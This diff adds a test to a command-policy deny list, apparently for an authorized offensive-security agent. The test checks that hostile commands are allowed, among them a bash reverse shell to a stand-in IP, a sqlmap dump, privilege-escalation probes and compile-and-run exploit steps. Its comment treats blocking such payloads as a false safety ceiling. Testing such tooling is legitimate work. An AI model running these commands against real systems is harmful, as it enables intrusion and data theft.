@@ -33,6 +33,22 @@ describe('seeded deny list (A7.7)', () => {
     expect(policy.rules.filter(rule => rule.mode === 'regex').length).toBe(SEED_IDS.length);
   });
 
+  // A17.7 (2026-10-27): the seeded deny list exists to stop self-destruction and platform breakage, never to gate the
+  // offensive work the operator authorized. A deny rule that fires on an ordinary payload class would be a capability
+  // ceiling dressed as safety, so this pins the absence across the classes the ladder uses.
+  it('never denies an offensive payload class: seeds are self-destruction only (A17.7)', () => {
+    const policy = commandPolicy();
+    const payloads = [
+      'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1', "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+      'nmap -sV -p- 10.0.0.5', 'sqlmap -u http://fixture.test/item?id=1 --batch --dump',
+      'nuclei -u http://fixture.test -t cves/', 'find / -perm -4000 -type f 2>/dev/null',
+      'sudo -l', 'id', 'whoami', 'uname -a', 'cat /etc/passwd', 'ls -la /root',
+      'gcc -o /work/exploit /work/exploit.c && /work/exploit', 'curl -sS -H "X-Api-Key: test" http://fixture.test/admin/users',
+      "python3 -c \"import requests;print(requests.get('http://10.0.0.5/').text)\"",
+    ];
+    for (const command of payloads) expect(policy.evaluate(request(command)), command).toMatchObject({ action: 'allow', ruleId: DEFAULT_RULE_ID });
+  });
+
   it('lets the operator disable a seed by name, records the name, and refuses to guess an unknown one', () => {
     const policy = commandPolicy(parseCommandPolicy(program([], { disableSeeds: ['seed.docker-cli', 'seed.mkfs', 'seed.not-a-rule'] })));
     expect(policy.disabledSeeds).toEqual(['seed.docker-cli', 'seed.mkfs']); // sorted, unknown id dropped
